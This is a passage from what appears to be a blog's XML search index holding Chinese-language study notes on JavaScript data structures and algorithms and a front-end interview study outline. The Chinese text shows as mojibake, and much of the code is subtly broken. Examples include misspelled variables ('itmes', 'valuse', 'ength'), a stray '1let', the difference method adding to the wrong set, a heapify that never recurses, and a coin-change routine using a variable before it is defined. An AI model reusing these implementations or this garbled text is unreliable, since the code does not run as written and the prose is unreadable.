if(!this.has(value))&#123; items[value] = value; return true; &#125; return false; &#125; this.remove = function(value)&#123; if(this.has(value))&#123; delete items[value]; return true &#125; return false; &#125; this.clear=function()&#123; items = &#123;&#125; &#125; this.size = function()&#123; return Object.keys(items).length; &#125; this.values = function()&#123; let values = []; for(let i = 0,keys=Object.keys(items);i&lt;keys.length;++i)&#123; values.push(itmes[keys[i]]); &#125; return values; &#125; //å¹¶é›† this.union = function(otherSet)&#123; let unionSet = new Set() let valuse = this.values(); for(let i = 0;i&lt;values.length;++i)&#123; unionSet.add(values[i]) &#125; valuse = otherSet.values(); for(let i = 0;i&lt;values.length;++i)&#123; unionSet.add(values[i]) &#125; return unionSet; &#125; //äº¤é›† this.intersection = function(otherSet)&#123; let intersectionSet = new Set() let values = this.values() for(let i = 0;i&lt;values.length;++i)&#123; if(otherSet.has(values[i]))&#123; intersectionSet.add(values[i]) &#125; &#125; return intersectionSet &#125; //å·®é›† this.difference = function(otherSet)&#123; let differenceSet = new Set() let values = this.values() for(let i = 0;i&lt;values.length;++i)&#123; if(!otherSet.has(values[i]))&#123; intersectionSet.add(values[i]) &#125; &#125; return differenceSet &#125;&#125; å­—å…¸/æ˜ å°„(æœªå®Œ)é”®å€¼å¯¹æ˜ å°„ï¼Œç±»ä¼¼äºŽé›†åˆå€¼å€¼å¯¹ 1234function Dictionary()&#123; let items = &#123;&#125;&#125;//å¯ç”¨Mapä»£æ›¿ æ•£åˆ—è¡¨é€šè¿‡ä¸€ä¸ªç‰¹å®šæ•£åˆ—å‡½æ•°å¤„ç†å€¼å¾—åˆ°ç‹¬ä¸€æ— äºŒçš„é”®å®žçŽ°å¿«é€ŸæŸ¥æ‰¾ï¼Œä½†å¼€çš„ç©ºé—´æ¯”è¾ƒå¤§ æ ‘12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364function BinarySearchTree()&#123; let Node = function(key)&#123; this.key = key; this.left = null; this.right = null; &#125; let root = null; let insertNode = function(node,newNode)&#123; if(newNode.key &lt; node.key)&#123; if(node.left === null)&#123; node.left = newNode &#125;else&#123; insertNode(node.left,newNode); &#125; &#125;else&#123; if(node.right===null)&#123; node.right = newNode; &#125;else&#123; insertNode(node.right,newNode); &#125; &#125; &#125; this.insert = function(key)&#123; let newNode = new Node(key); if(root === null)&#123; root = newNode; &#125;else&#123; insertNode(root,newNode); &#125; &#125; this.inOrderTraverse = function(callback)&#123; inOrderTraverseNode(root,callback); &#125; let inOrderTraverseNode = (node,callback)=&gt;&#123; if(node!==null)&#123; inOrderTraverseNode(node.left,callback); callback(node.key) inOrderTraverseNode(node.right,callback); &#125; &#125; this.preOrderTraverse = function(callback)&#123; preOrderTraverseNode(root,callback); &#125; let preOrderTraverseNode = (node,callback)=&gt;&#123; if(node!==null)&#123; callback(node.key) preOrderTraverseNode(node.left,callback); preOrderTraverseNode(node.right,callback); &#125; &#125; this.postOrderTraverse = function(callback)&#123; postOrderTraverseNode(root,callback); &#125; let postOrderTraverseNode = (node,callback)=&gt;&#123; if(node!==null)&#123; postOrderTraverseNode(node.left,callback); postOrderTraverseNode(node.right,callback); callback(node.key) &#125; &#125; this.print = function()&#123; return root; &#125;&#125; ç®—æ³•æŽ’åºç®—æ³•123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140//å†’æ³¡O(n^2)bbubbleSort = (arr) =&gt;&#123; let length = arr.length; for(1let i = 0;i&lt;length;++i)&#123; for(let j = 0;j&lt;length-1-i;++j)&#123; if(arr[j]&gt;arr[j+1])&#123; let temp = arr[j]; arr[j]=arr[j+1]; arr[j+1]=temp; &#125; &#125; &#125;&#125;//é€‰æ‹©O(n^2)selectionSort = (arr)=&gt;&#123; let length = arr.length,indexMin; for(let i = 0;i&lt;length-1;++i)&#123; indexMin = i; for(let j = i;j&lt;length;++j)&#123; if(arr[indexMin]&gt;arr[j])&#123; indexMin = j; &#125; &#125; if(i!=indexMin)&#123; let temp = arr[i]; arr[i]=arr[indexMin]; arr[indexMin]=temp; &#125; &#125;&#125;//æ’å…¥O(n^2)ï¼Œå°æ•°ç»„æ¯”ä¸Šé¢å¥½insertionSort = (arr)=&gt;&#123; let length = arr.length,j,temp; for(let i = 1;i&lt;ength;++i)&#123; j = i; temp = arr[i] while(j&gt;0&amp;&amp;arr[j-1]&gt;temp)&#123; arr[j]= arr[j-1] j--; &#125; arr[j]=temp &#125;&#125;//å½’å¹¶O(nlogn)åˆ†æ²»mergeSort = (arr) =&gt;&#123; arr = mergeSortRec(arr)&#125;mergeSortRec = (arr) =&gt;&#123; let length = arr.length; if(length==1)&#123; return arr &#125; let mid = Math.floor(length/2) left = arr.slice(0,mid) right = arr.slice(mid,length) return merge(mergeSortRec(left),mergeSortRec(right))&#125;merge = (left,right) =&gt;&#123; let result = [], il = 0, ir = 0; while(il&lt;left.length&amp;&amp;ir&lt;right.length)&#123; if(left[il]&lt;right[ir])&#123; result.push(left[il++]); &#125;else&#123; result.push(right[ir++]) &#125; &#125; while(il&lt;left.length)&#123; result.push(left[il++]); &#125; while(ir&lt;right.length)&#123; result.push(right[ir++]) &#125; return result&#125;//å¿«æŽ’O(nlogn)quickSort=(arr)=&gt;&#123; quick(arr,0,arr.length-1)&#125;quick = (arr,left,right)&#123; let index if(arr.length&gt;1)&#123; index = partition(arr,left,right) if(left&lt;index-1)&#123; quick(arr,left,index-1) &#125; if(index&lt;right)&#123; quick(arr,index,right) &#125; &#125;&#125;partition=(arr,left,right)=&gt;&#123; let pivot = arr[Math.floor((right+left)/2)], i=left,j=right; while(i&lt;=j)&#123; while(arr[i]&lt;pivot)&#123; ++i; &#125; while(arr[j]&gt;pivot)&#123; j-- &#125; if(i&lt;=j)&#123; let temp = arr[j] arr[j]=arr[i] arr[i] = temp &#125; &#125; return i&#125;//å †æŽ’å¯¹ä¸€é¢—å®Œå…¨äºŒå‰æ ‘ï¼Œä½œä¸ºæ•°ç»„ï¼ŒæŸèŠ‚ç‚¹içˆ¶èŠ‚ç‚¹ä¸ºMath.floor((i-1)/2),å­èŠ‚ç‚¹2i+1,2i+2let heapSort = (arr)=&gt;&#123; let heapSize =arr.length; buildHeap(arr) while(heapSize&gt;1)&#123; heapSize--; [arr[0],arr[heapSize]]=[arr[heapSize],arr[0]] heapify(arr,heapSize,0) &#125;&#125;let buildHeap = (arr)=&gt;&#123; heapSize = arr.length for(let i = Math.floor(arr.length/2);i&gt;=0;i--)&#123; heapify(arr,heapSize,i) &#125;&#125;let heapify = (arr,heapSize,i)=&gt;&#123; let left = 2*i+1,right = i*2+2,largest = i; if(left&lt;heapSize &amp;&amp; arr[left]&gt;arr[largest])&#123; largest = left; &#125; if(right&lt;heapSize &amp;&amp; arr[right]&gt;arr[largest])&#123; largest = right; &#125; if(largest!=i)&#123; [arr[i],arr[largest]]=[arr[largest],arr[i]] &#125;&#125; æœç´¢ç®—æ³•12345678910111213141516171819//é¡ºåº//äºŒåˆ†binarySearch = (arr,item)=&gt;&#123; let brr = quickSort(arr) let low = 0,high = brr.length -1,mid,element; while(low&lt;=high)&#123; mid = Math.floor((low+high)/2); element = brr[mid] if(element &lt;item)&#123; low = mid+1; &#125;else if(element &gt;item)&#123; high = mid -1; &#125;else&#123; return mid &#125; &#125; return -1&#125; ç®—æ³•æ¨¡å¼12345678910111213141516//é€’å½’ ES6æœ‰å°¾è°ƒç”¨ä¼˜åŒ–ï¼Œé€’å½’å¹¶ä¸æ›´æ…¢fibonacci = (num)=&gt;&#123; if(num ===1||num===2)&#123; return 1 &#125; return fibonacci(num-1)+fibonacci(num-2)&#125;fib = (num)=&gt;&#123; let n1 = 1,n2=1,n=1; for(let i = 3;i&lt;num;++i)&#123; n = n1+n2; n1=n2; n2=n; &#125; return n&#125; åŠ¨æ€è§„åˆ’æœ€å°‘ç¡¬å¸12345678910111213141516171819202122232425262728let minCoin = (coins) =&gt;&#123; let cache = &#123;&#125;; this.makeChange = (amount)=&gt;&#123; let me = this; if(!amount)&#123; return []; &#125; if(cache[amount])&#123; return cache[amount] &#125; let min = [],newMin,newAmount; for(let i = 0;i&lt;coins.length;++i)&#123; let newAmount = amount -coin,coin = coins[i]; if(newAmount &gt;= 0)&#123; newMin = me.makeChange(newAmount); &#125; if( newAmount&gt;=0&amp;&amp; (newMin.length&lt;min.length-1||!min.length) &amp;&amp;(newMin.lengthh||!newAmount) )&#123; min = [coin].concat(newMin); console.log(min+&apos;for&apos;+amount) &#125; &#125; return (cache[amount]=min) &#125;&#125; è´ªå¿ƒæœ€å°‘ç¡¬å¸123456789101112131415function minChange(coins,amount)&#123; coins = quickSort(coins) let l = coins.length-1,cache = []; while(l&gt;=0&amp;&amp;amount&gt;=0)&#123; if(amount&gt;=coins[l])&#123; cache.push(coins[l]) amount -=coins[l] &#125;else&#123; l-- &#125; &#125; return cache&#125;//é—®é¢˜ï¼Œåªåœ¨ç›¸é‚»çº§åˆ«ä¸­ï¼Œå‰ä¸€çº§æ¯”åŽä¸€çº§å°‘ä¸€åŠä»¥ä¸Šæ‰å¯ä»¥[1,2,5,10,20,50,100],å¦‚æžœæ˜¯[1,3,4]è¿™ç§ä¸è¡Œç¬¬ä¸€ç§ä»Žè¾ƒå°çš„ç¡¬å¸é›†åˆå¼€å§‹ç®—ï¼Œåªæœ‰[1],[1,3],[1,3,4] æ•°ç»„åŽ»é‡https://zhuanlan.zhihu.com/p/26388217]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>å­¦ä¹ æŒ‡å—</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯å­¦ä¹ æŒ‡å—]]></title>
    <url>%2F2019%2F06%2F03%2Finterview%2F</url>
    <content type="text"><![CDATA[å‰è¨€ å‰ç«¯å­¦ä¹ æŒ‡å— å‰è¨€è®¡ç®—æœºé€šè¯†è®¡ç®—æœºç»„æˆåŽŸç†https://github.com/CyC2018/CS-Notes/blob/master/notes/pics/_u4E0B_u8F7D.png) è®¡ç®—æœºç½‘ç»œæ“ä½œç³»ç»Ÿå†…å­˜æ ˆå†…å­˜ä¸­å˜é‡å­˜å‚¨çš„æ˜¯å¯¹è±¡åœ¨å †å†…å­˜ä¸­çš„åœ°å€ è¿›ç¨‹ä¸Žçº¿ç¨‹è¿›ç¨‹æ˜¯ CPU èµ„æºåˆ†é…çš„æœ€å°å•ä½ï¼›çº¿ç¨‹æ˜¯ CPU è°ƒåº¦çš„æœ€å°å•ä½ã€‚ ä»¥ Chrome æµè§ˆå™¨ä¸­ä¸ºä¾‹ï¼Œå½“ä½ æ‰“å¼€ä¸€ä¸ª Tab é¡µæ—¶ï¼Œå…¶å®žå°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªè¿›ç¨‹ï¼Œä¸€ä¸ªè¿›ç¨‹ä¸­å¯ä»¥æœ‰å¤šä¸ªçº¿ç¨‹ï¼ˆä¸‹æ–‡ä¼šè¯¦ç»†ä»‹ç»ï¼‰ï¼Œæ¯”å¦‚æ¸²æŸ“çº¿ç¨‹ã€JS å¼•æ“Žçº¿ç¨‹ã€HTTP è¯·æ±‚çº¿ç¨‹ç­‰ç­‰ã€‚å½“ä½ å‘èµ·ä¸€ä¸ªè¯·æ±‚æ—¶ï¼Œå…¶å®žå°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªçº¿ç¨‹ï¼Œå½“è¯·æ±‚ç»“æŸåŽï¼Œè¯¥çº¿ç¨‹å¯èƒ½å°±ä¼šè¢«é”€æ¯ã€‚ å½“æˆ‘ä»¬å¯åŠ¨ä¸€ä¸ªåº”ç”¨ï¼Œè®¡ç®—æœºä¼šåˆ›å»ºä¸€ä¸ªè¿›ç¨‹ï¼Œæ“ä½œç³»ç»Ÿä¼šä¸ºè¿›ç¨‹åˆ†é…ä¸€éƒ¨åˆ†å†…å­˜ï¼Œåº”ç”¨çš„æ‰€æœ‰çŠ¶æ€éƒ½ä¼šä¿å­˜åœ¨è¿™å—å†…å­˜ä¸­ï¼Œåº”ç”¨ä¹Ÿè®¸è¿˜ä¼šåˆ›å»ºå¤šä¸ªçº¿ç¨‹æ¥è¾…åŠ©å·¥ä½œï¼Œè¿™äº›çº¿ç¨‹å¯ä»¥å…±äº«è¿™éƒ¨åˆ†å†…å­˜ä¸­çš„æ•°æ®ã€‚å¦‚æžœåº”ç”¨å…³é—­ï¼Œè¿›ç¨‹ä¼šè¢«ç»ˆç»“ï¼Œæ“ä½œç³»ç»Ÿä¼šé‡Šæ”¾ç›¸å…³å†…å­˜ã€‚ ä¸€ä¸ªè¿›ç¨‹è¿˜å¯ä»¥è¦æ±‚æ“ä½œç³»ç»Ÿç”Ÿæˆå¦ä¸€ä¸ªè¿›ç¨‹æ¥æ‰§è¡Œä¸åŒçš„ä»»åŠ¡ï¼Œç³»ç»Ÿä¼šä¸ºæ–°çš„è¿›ç¨‹åˆ†é…ç‹¬ç«‹çš„å†…å­˜ï¼Œä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´å¯ä»¥ä½¿ç”¨ IPC ï¼ˆInter Process Communicationï¼‰è¿›è¡Œé€šä¿¡ã€‚å¾ˆå¤šåº”ç”¨éƒ½ä¼šé‡‡ç”¨è¿™æ ·çš„è®¾è®¡ï¼Œå¦‚æžœä¸€ä¸ªå·¥ä½œè¿›ç¨‹ååº”è¿Ÿé’ï¼Œé‡å¯è¿™ä¸ªè¿›ç¨‹ä¸ä¼šå½±å“åº”ç”¨å…¶å®ƒè¿›ç¨‹çš„å·¥ä½œã€‚ çº¿ç¨‹çš„é‚£äº›èµ„æºå…±äº«ï¼Œé‚£äº›èµ„æºä¸å…±äº« å…±äº«çš„èµ„æºæœ‰ a. å † ç”±äºŽå †æ˜¯åœ¨è¿›ç¨‹ç©ºé—´ä¸­å¼€è¾Ÿå‡ºæ¥çš„ï¼Œæ‰€ä»¥å®ƒæ˜¯ç†æ‰€å½“ç„¶åœ°è¢«å…±äº«çš„ï¼›å› æ­¤newå‡ºæ¥çš„éƒ½æ˜¯å…±äº«çš„ï¼ˆ16ä½å¹³å°ä¸Šåˆ†å…¨å±€å †å’Œå±€éƒ¨å †ï¼Œå±€éƒ¨å †æ˜¯ç‹¬äº«çš„ï¼‰ b. å…¨å±€å˜é‡ å®ƒæ˜¯ä¸Žå…·ä½“æŸä¸€å‡½æ•°æ— å…³çš„ï¼Œæ‰€ä»¥ä¹Ÿä¸Žç‰¹å®šçº¿ç¨‹æ— å…³ï¼›å› æ­¤ä¹Ÿæ˜¯å…±äº«çš„ c. é™æ€å˜é‡è™½ç„¶å¯¹äºŽå±€éƒ¨å˜é‡æ¥è¯´ï¼Œå®ƒåœ¨ä»£ç ä¸­æ˜¯â€œæ”¾â€åœ¨æŸä¸€å‡½æ•°ä¸­çš„ï¼Œä½†æ˜¯å…¶å­˜æ”¾ä½ç½®å’Œå…¨å±€å˜é‡ä¸€æ ·ï¼Œå­˜äºŽå †ä¸­å¼€è¾Ÿçš„.bsså’Œ.dataæ®µï¼Œæ˜¯å…±äº«çš„ d. æ–‡ä»¶ç­‰å…¬ç”¨èµ„æº è¿™ä¸ªæ˜¯å…±äº«çš„ï¼Œä½¿ç”¨è¿™äº›å…¬å…±èµ„æºçš„çº¿ç¨‹å¿…é¡»åŒæ­¥ã€‚Win32 æä¾›äº†å‡ ç§åŒæ­¥èµ„æºçš„æ–¹å¼ï¼ŒåŒ…æ‹¬ä¿¡å·ã€ä¸´ç•ŒåŒºã€äº‹ä»¶å’Œäº’æ–¥ä½“ã€‚ ç‹¬äº«çš„èµ„æºæœ‰ a. æ ˆ æ ˆæ˜¯ç‹¬äº«çš„ b. å¯„å­˜å™¨ è¿™ä¸ªå¯èƒ½ä¼šè¯¯è§£ï¼Œå› ä¸ºç”µè„‘çš„å¯„å­˜å™¨æ˜¯ç‰©ç†çš„ï¼Œæ¯ä¸ªçº¿ç¨‹åŽ»å–å€¼éš¾é“ä¸ä¸€æ ·å—ï¼Ÿå…¶å®žçº¿ç¨‹é‡Œå­˜æ”¾çš„æ˜¯å‰¯æœ¬ï¼ŒåŒ…æ‹¬ç¨‹åºè®¡æ•°å™¨PC æ­»é”æ­»é”æ˜¯æŒ‡ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„è¿›ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œç”±äºŽç«žäº‰èµ„æºæˆ–è€…ç”±äºŽå½¼æ­¤é€šä¿¡è€Œé€ æˆçš„ä¸€ç§é˜»å¡žçš„çŽ°è±¡ï¼Œè‹¥æ— å¤–åŠ›ä½œç”¨ï¼Œå®ƒä»¬éƒ½å°†æ— æ³•æŽ¨è¿›ä¸‹åŽ»ã€‚æ­¤æ—¶ç§°ç³»ç»Ÿå¤„äºŽæ­»é”çŠ¶æ€æˆ–ç³»ç»Ÿäº§ç”Ÿäº†æ­»é”ï¼Œè¿™äº›æ°¸è¿œåœ¨äº’ç›¸ç­‰å¾…çš„è¿›ç¨‹ç§°ä¸ºæ­»é”è¿›ç¨‹ã€‚ æ­»é”çš„å‘ç”Ÿå¿…é¡»å…·å¤‡ä»¥ä¸‹å››ä¸ªå¿…è¦æ¡ä»¶ï¼š 1ï¼‰äº’æ–¥æ¡ä»¶ï¼šæŒ‡è¿›ç¨‹å¯¹æ‰€åˆ†é…åˆ°çš„èµ„æºè¿›è¡ŒæŽ’å®ƒæ€§ä½¿ç”¨ï¼Œå³åœ¨ä¸€æ®µæ—¶é—´å†…æŸèµ„æºåªç”±ä¸€ä¸ªè¿›ç¨‹å ç”¨ã€‚å¦‚æžœæ­¤æ—¶è¿˜æœ‰å…¶å®ƒè¿›ç¨‹è¯·æ±‚èµ„æºï¼Œåˆ™è¯·æ±‚è€…åªèƒ½ç­‰å¾…ï¼Œç›´è‡³å æœ‰èµ„æºçš„è¿›ç¨‹ç”¨æ¯•é‡Šæ”¾ã€‚ ï¼ˆæ‰“ç ´äº’æ–¥æ¡ä»¶ï¼šæ”¹é€ ç‹¬å æ€§èµ„æºä¸ºè™šæ‹Ÿèµ„æºï¼Œå¤§éƒ¨åˆ†èµ„æºå·²æ— æ³•æ”¹é€ ï¼‰ 2ï¼‰è¯·æ±‚å’Œä¿æŒæ¡ä»¶ï¼šæŒ‡è¿›ç¨‹å·²ç»ä¿æŒè‡³å°‘ä¸€ä¸ªèµ„æºï¼Œä½†åˆæå‡ºäº†æ–°çš„èµ„æºè¯·æ±‚ï¼Œè€Œè¯¥èµ„æºå·²è¢«å…¶å®ƒè¿›ç¨‹å æœ‰ï¼Œæ­¤æ—¶è¯·æ±‚è¿›ç¨‹é˜»å¡žï¼Œä½†åˆå¯¹è‡ªå·±å·²èŽ·å¾—çš„å…¶å®ƒèµ„æºä¿æŒä¸æ”¾ã€‚ ï¼ˆæ‰“ç ´ä¸å¯æŠ¢å æ¡ä»¶ï¼šå½“ä¸€è¿›ç¨‹å æœ‰ä¸€ç‹¬å æ€§èµ„æºåŽåˆç”³è¯·ä¸€ç‹¬å æ€§èµ„æºè€Œæ— æ³•æ»¡è¶³ï¼Œåˆ™é€€å‡ºåŽŸå æœ‰çš„èµ„æºï¼‰ 3ï¼‰ä¸å‰¥å¤ºæ¡ä»¶ï¼šæŒ‡è¿›ç¨‹å·²èŽ·å¾—çš„èµ„æºï¼Œåœ¨æœªä½¿ç”¨å®Œä¹‹å‰ï¼Œä¸èƒ½è¢«å‰¥å¤ºï¼Œåªèƒ½åœ¨ä½¿ç”¨å®Œæ—¶ç”±è‡ªå·±é‡Šæ”¾ã€‚ ï¼ˆæ‰“ç ´å æœ‰ä¸”ç”³è¯·æ¡ä»¶ï¼šé‡‡ç”¨èµ„æºé¢„å…ˆåˆ†é…ç­–ç•¥ï¼Œå³è¿›ç¨‹è¿è¡Œå‰ç”³è¯·å…¨éƒ¨èµ„æºï¼Œæ»¡è¶³åˆ™è¿è¡Œï¼Œä¸ç„¶å°±ç­‰å¾…ï¼Œè¿™æ ·å°±ä¸ä¼šå æœ‰ä¸”ç”³è¯·ï¼‰ 4ï¼‰çŽ¯è·¯ç­‰å¾…æ¡ä»¶ï¼šæŒ‡åœ¨å‘ç”Ÿæ­»é”æ—¶ï¼Œå¿…ç„¶å­˜åœ¨ä¸€ä¸ªè¿›ç¨‹â€”â€”èµ„æºçš„çŽ¯å½¢é“¾ï¼Œå³è¿›ç¨‹é›†åˆ{P0ï¼ŒP1ï¼ŒP2ï¼ŒÂ·Â·Â·ï¼ŒPn}ä¸­çš„P0æ­£åœ¨ç­‰å¾…ä¸€ä¸ªP1å ç”¨çš„èµ„æºï¼›P1æ­£åœ¨ç­‰å¾…P2å ç”¨çš„èµ„æºï¼Œâ€¦â€¦ï¼ŒPnæ­£åœ¨ç­‰å¾…å·²è¢«P0å ç”¨çš„èµ„æºã€‚ ï¼ˆæ‰“ç ´å¾ªçŽ¯ç­‰å¾…æ¡ä»¶ï¼šå®žçŽ°èµ„æºæœ‰åºåˆ†é…ç­–ç•¥ï¼Œå¯¹æ‰€æœ‰è®¾å¤‡å®žçŽ°åˆ†ç±»ç¼–å·ï¼Œæ‰€æœ‰è¿›ç¨‹åªèƒ½é‡‡ç”¨æŒ‰åºå·é€’å¢žçš„å½¢å¼ç”³è¯·èµ„æºï¼‰ ç¼–è¯‘åŽŸç†æ•°å­¦åŸºç¡€ç¦»æ•£æ•°å­¦çº¿æ€§ä»£æ•°æ•°æ®ç»“æž„ä¸Žç®—æ³•æ•°æ®ç»“æž„çº¿æ€§è¡¨æ ˆã€é˜Ÿåˆ—ä¸¤ä¸ªæ ˆå®žçŽ°é˜Ÿåˆ—ã€‚ é“¾è¡¨æ’å…¥èŠ‚ç‚¹ã€é“¾è¡¨é€†ç½®ã€ä½¿ç”¨é“¾è¡¨è¿›è¡Œå¤§æ•°å­—çš„åŠ å‡ï¼ŒåŒå‘é“¾è¡¨å®žçŽ°é˜Ÿåˆ—ã€å¯»æ‰¾é“¾è¡¨ä¸­çš„çŽ¯ï¼‰ æ ‘å±‚æ¬¡éåŽ†ã€æ±‚æ·±åº¦ã€æ±‚ä¸¤ä¸ªèŠ‚ç‚¹è·ç¦»ã€ç¿»è½¬äºŒå‰æ ‘ã€å‰ä¸­åŽåºéåŽ†ï¼‰çº¢é»‘æ ‘æ€§è´¨ å †å¤§é‡æ•°æ®ä¸­å¯»æ‰¾æœ€å¤§Nä¸ªæ•°å­—å‡ ä¹Žæ¯æ¬¡éƒ½ä¼šé—®ï¼Œè¿˜æœ‰å †åœ¨æ’å…¥æ—¶è¿›è¡Œçš„è°ƒæ•´ï¼‰ å›¾æ·±åº¦å¹¿åº¦ä¼˜å…ˆéåŽ†ã€å•æºæœ€çŸ­è·¯å¾„ã€æœ€å°ç”Ÿæˆæ ‘ï¼‰ ç®—æ³•æŸ¥æ‰¾äºŒåˆ†æŸ¥æ‰¾ï¼ˆä¸€èˆ¬ä¼šæ·±å…¥ï¼Œå¦‚å¯»æ‰¾æ•°ç»„æ€»å’Œä¸ºKçš„ä¸¤ä¸ªæ•°å­— æŽ’åºæŽ’åºï¼ˆå…«å¤§æŽ’åºï¼Œå„è‡ªçš„æ—¶é—´å¤æ‚åº¦ã€æŽ’åºç®—æ³•çš„ç¨³å®šæ€§ã€‚å¿«æŽ’å‡ ä¹Žæ¯æ¬¡éƒ½é—®ï¼‰ åŠ¨æ€è§„åˆ’è´ªå¿ƒåˆ†æ²»å‰ç«¯åŸºç¡€HTML5H5æ–°ç‰¹æ€§ï¼š(1)Canvasç»˜å›¾(2)SVGç»˜å›¾(3)åœ°ç†å®šä½(4)Web Workerweb worker æ˜¯è¿è¡Œåœ¨åŽå°çš„ JSï¼Œç‹¬ç«‹äºŽå…¶ä»–è„šæœ¬ï¼Œä¸ä¼šå½±å“é¡µé¢çš„æ€§èƒ½ã€‚(5)Web Storage1.CookieæŠ€æœ¯ ï¼ˆ å…¼å®¹æ€§å¥½,æ•°æ®ä¸èƒ½è¶…4kb,æ“ä½œå¤æ‚ï¼‰2.ï¼ˆå…¼å®¹æ€§å·®,æ•°æ®8MB,æ“ä½œç®€å•ï¼‰sessionStorage 3.localStorage(6)Web SocketWebSocketåè®®æ˜¯åŸºäºŽTCPçš„ä¸€ç§æ–°çš„ç½‘ç»œåè®®ã€‚å®ƒå®žçŽ°äº†æµè§ˆå™¨ä¸ŽæœåŠ¡å™¨å…¨åŒå·¥(full-duplex)é€šä¿¡â€”â€”å…è®¸æœåŠ¡å™¨ä¸»åŠ¨å‘é€ä¿¡æ¯ç»™å®¢æˆ·ç«¯ã€‚ CSS31.å¤æ‚çš„é€‰æ‹©å™¨2.å¼¹æ€§å¸ƒå±€3.åŠ¨ç”» dpr initial-scale px rem ç‰©ç†åƒç´  JavaScript12const peopleConfig = Object.create(peopleConfigPrototype)// é‡‡ç”¨Object.createæ–¹æ³•ï¼Œå½“å‰å¯¹è±¡å°†è¢«å¤åˆ¶åˆ°peopleConfigçš„__proto__ä¸Š è¿˜æœ‰å¦ä¸€ç§æ–¹å¼è¿›è¡Œå¯¹è±¡æ‹·è´ï¼Œä½†æ˜¯ä¼šä¸¢æŽ‰å¯¹è±¡ä¸­çš„å‡½æ•°ï¼š 1const peopleConfig = JSON.parse(JSON.stringfy(peopleConfigProtytype)) MVCï¼ŒMVVMå°±æ˜¯éžå¸¸å…¸åž‹çš„ä¸­ä»‹æ¨¡å¼ã€‚ ä¸­ä»‹æ¨¡å¼ï¼Œæ¡¥æŽ¥æ¨¡å¼ï¼Œä»£ç†æ¨¡å¼çš„åŒºåˆ«æ˜¯ï¼š ä»£ç†æ¨¡å¼ä¸€å¯¹ä¸€ï¼Œåªèƒ½ä»£ç†ç‰¹å®šç±»å’Œå¯¹è±¡ï¼Œæ˜¯å¯¹å…¶çš„æ‰©å±•æˆ–æ˜¯çº¦æŸã€‚ æ¡¥æŽ¥æ¨¡å¼ä¸€å¯¹å¤šï¼Œæ˜¯å¯¹ç±»æˆ–å¯¹è±¡æˆå‘˜æˆ–å±žæ€§çš„æ‰©å±•ã€‚ ä¸­ä»‹æ¨¡å¼å¤šå¯¹å¤šï¼Œå…¨æƒæ‰¿åŒ…æ‰€æœ‰ä¸¤ä¸ªæ¦‚å¿µé—´çš„å…³ç³»ã€‚ https://zhuanlan.zhihu.com/p/43283016 è®¾è®¡æ¨¡å¼ ES6ES7+TypeScript1.å®ƒæ˜¯JavaScriptçš„ä¸€ä¸ªè¶…é›†ï¼Œè€Œä¸”æœ¬è´¨ä¸Šå‘è¿™ä¸ªè¯­è¨€æ·»åŠ äº†å¯é€‰çš„é™æ€ç±»åž‹å’ŒåŸºäºŽç±»çš„é¢å‘å¯¹è±¡ç¼–ç¨‹ã€‚2.TypeScriptæ‰©å±•äº†JavaScriptçš„è¯­æ³•ï¼Œæ‰€ä»¥ä»»ä½•çŽ°æœ‰çš„JavaScriptç¨‹åºå¯ä»¥ä¸åŠ æ”¹å˜çš„åœ¨TypeScriptä¸‹å·¥ä½œã€‚TypeScriptæ˜¯ä¸ºå¤§åž‹åº”ç”¨ä¹‹å¼€å‘è€Œè®¾è®¡ï¼Œè€Œç¼–è¯‘æ—¶å®ƒäº§ç”Ÿ JavaScript ä»¥ç¡®ä¿å…¼å®¹æ€§ã€‚ Node.jsæµè§ˆå™¨æ•°æ®åº“cookie/session/LocalStorage/SessionStorage cookie session LocalStorage SessionStorage å·¥ç¨‹åŒ–æ€§èƒ½ä¼˜åŒ–å®‰å…¨æµ‹è¯•ç®¡ç†GitWebpackæ¨¡å—åŒ–ç»„ä»¶åŒ– åç§° è¯´æ˜Ž ä¸¾ä¾‹ JSæ¨¡å— ç‹¬ç«‹çš„ç®—æ³•å’Œæ•°æ®å•å…ƒ æµè§ˆå™¨çŽ¯å¢ƒæ£€æµ‹(detect)ï¼Œç½‘ç»œè¯·æ±‚(ajax)ï¼Œåº”ç”¨é…ç½®(config)ï¼ŒDOMæ“ä½œ(dom)ï¼Œå·¥å…·å‡½æ•°(utils)ï¼Œä»¥åŠç»„ä»¶é‡Œçš„JSå•å…ƒ CSSæ¨¡å— ç‹¬ç«‹çš„åŠŸèƒ½æ€§æ ·å¼å•å…ƒ æ …æ ¼ç³»ç»Ÿ(grid)ï¼Œå­—ä½“å›¾æ ‡(icon-fonts)ï¼ŒåŠ¨ç”»æ ·å¼(animate)ï¼Œä»¥åŠç»„ä»¶é‡Œçš„CSSå•å…ƒ UIç»„ä»¶ ç‹¬ç«‹çš„å¯è§†/å¯äº¤äº’åŠŸèƒ½å•å…ƒ é¡µå¤´(header)ï¼Œé¡µå°¾(footer)ï¼Œå¯¼èˆªæ (nav)ï¼Œæœç´¢æ¡†(search) é¡µé¢ å‰ç«¯è¿™ç§GUIè½¯ä»¶çš„ç•Œé¢çŠ¶æ€ï¼Œæ˜¯UIç»„ä»¶çš„å®¹å™¨ é¦–é¡µ(index)ï¼Œåˆ—è¡¨é¡µ(list)ï¼Œç”¨æˆ·ç®¡ç†(user) åº”ç”¨ æ•´ä¸ªé¡¹ç›®æˆ–æ•´ä¸ªç«™ç‚¹è¢«ç§°ä¹‹ä¸ºåº”ç”¨ï¼Œç”±å¤šä¸ªé¡µé¢ç»„æˆ æ¡†æž¶ReactVueè®¾è®¡æ¨¡å¼å‡½æ•°å¼ç¼–ç¨‹https://www.flyzy2005.cn/tech/net/https-ssl-tls/ https://github.com/CyC2018/CS-Notes]]></content>
      <categories>
        <category>FrontEnd</category>
      </categories>
      <tags>
        <tag>å­¦ä¹ æŒ‡å—</tag>
      </tags>
  </entry>
  <entry>
